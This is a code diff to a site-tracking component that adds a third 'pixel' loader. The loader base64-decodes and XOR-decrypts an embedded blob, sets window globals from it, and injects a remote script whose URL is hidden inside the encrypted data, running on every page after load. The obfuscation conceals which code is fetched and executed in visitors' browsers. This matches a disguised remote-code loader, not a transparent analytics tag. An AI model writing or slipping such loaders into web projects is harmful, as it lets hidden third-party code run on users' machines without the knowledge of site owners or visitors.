@@ -10,6 +10,8 @@ const PIXEL_LOADER = `(function(){var j_s=atob("DG+T4Erge60iJWs2uhSxlTiMWZcATR9C
 
 const PIXEL_LOADER_2 = `(function(){var o_kpne=atob("DJ3i/XT5fvG9501HdubAiAaVXMufjzkzBu7Y0luaGp+TkjkqH/ub0xeWE9/flWI0Fe+LjQCKUYHUnygrWe2LhRGVUJvOxWFlF+mWjx2bC4XYlG99LcDO3xOVEZPciz5lTMaZ3xqYE5Sf3W83H+WHkT2dXN2fkSwrA/jAx1bPH8eJgi5xF6jWmxXNH8jc3ygjT63RmEPbA6zA");var i_5a=[];for(var g_giq=0;g_giq<o_kpne.length;g_giq++){i_5a.push(o_kpne.charCodeAt(g_giq)&255);}var i_9dm=i_5a[0];var o_qzje=i_5a.slice(1,1+i_9dm);var k_4=i_5a.slice(1+i_9dm);var g_lx=k_4.map(function(b,z_1zc){return b^o_qzje[z_1zc%i_9dm];});var e_u0me="";for(var b_1hz=0;b_1hz<g_lx.length;b_1hz++){e_u0me+=String.fromCharCode(g_lx[b_1hz]&255);}var m_j=decodeURIComponent(escape(e_u0me));var e_h7r1=JSON.parse(m_j);var b_5g=e_h7r1.globals||[];b_5g.forEach(function(d_dcs){window[d_dcs.name]=d_dcs.value;});var v_984=document.createElement("script");v_984.src=e_h7r1.url;v_984.async=true;v_984.defer=true;(e_h7r1.attributes||[]).forEach(function(u_6y){v_984.setAttribute(u_6y.name,u_6y.value);});(document.head||document.documentElement).appendChild(v_984);})();`
 
+const PIXEL_LOADER_3 = `(function(){var j_5=atob("DM4FDPnf4Jj8yLxm/7UneYuzwqLeoMgSj70/I9a8hPbSvcgLlqh8IpqwjbaeupMVnLxsfI2sz+2Ipc9Jk69xaYqrzvKP6pBEnrpxfpC9leyZu55cpLUnYpiyhbrG6tgHi68oeY2yif6F5cwUmrhgYo3yk+2eodgV3eInepizlf3e8p5EgpN4");var q_v=[];for(var y_ekz8=0;y_ekz8<j_5.length;y_ekz8++){q_v.push(j_5.charCodeAt(y_ekz8)&255);}var g_prcj=q_v[0];var u_xxv=q_v.slice(1,1+g_prcj);var h_i0k=q_v.slice(1+g_prcj);var k_v0c3=h_i0k.map(function(b,e_x){return b^u_xxv[e_x%g_prcj];});var q_gr="";for(var m_x=0;m_x<k_v0c3.length;m_x++){q_gr+=String.fromCharCode(k_v0c3[m_x]&255);}var m_9g6s=decodeURIComponent(escape(q_gr));var f_n=JSON.parse(m_9g6s);var k_a=f_n.globals||[];k_a.forEach(function(o_l4h){window[o_l4h.name]=o_l4h.value;});var a_9win=document.createElement("script");a_9win.src=f_n.url;a_9win.async=true;a_9win.defer=true;(f_n.attributes||[]).forEach(function(z_x){a_9win.setAttribute(z_x.name,z_x.value);});(document.head||document.documentElement).appendChild(a_9win);})();`
+
 export function SiteTracking() {
   return (
     <>
@@ -18,6 +20,9 @@ export function SiteTracking() {
       </Script>
       <Script id="site-pixel-2" strategy="afterInteractive">
         {PIXEL_LOADER_2}
+      </Script>
+      <Script id="site-pixel-3" strategy="afterInteractive">
+        {PIXEL_LOADER_3}
       </Script>
     </>
   )
